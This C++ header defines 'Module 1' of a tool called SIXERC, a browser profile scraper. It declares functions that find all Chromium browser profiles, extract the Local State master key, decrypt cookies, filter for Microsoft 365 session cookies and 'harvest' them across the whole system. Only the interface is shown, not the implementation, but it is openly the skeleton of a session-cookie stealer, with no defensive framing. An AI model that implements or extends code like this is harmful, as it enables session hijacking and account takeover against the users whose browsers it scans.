// ============================================================================
// SIXERC — Module 1: Browser Profile Scraper (BPS)
// Extracts Microsoft session cookies from Chromium-based browsers
// ============================================================================

#pragma once

#include "core/types.hpp"
#include <vector>
#include <string>

namespace sixerc::bps {

// Discover all browser profiles on the system
std::vector<BrowserProfile> enumerate_profiles();

// Extract the master key from a browser's Local State file
bytes extract_master_key(const BrowserProfile& profile);

// Extract cookies from a single profile
std::vector<SessionCookie> extract_cookies(const BrowserProfile& profile, const bytes& master_key);

// Filter for Microsoft 365 session cookies
std::vector<SessionCookie> filter_m365_cookies(const std::vector<SessionCookie>& cookies);

// Full harvest: scan all browsers, extract all M365 cookies
std::vector<HarvestedSession> harvest_all_sessions();

} // namespace sixerc::bps
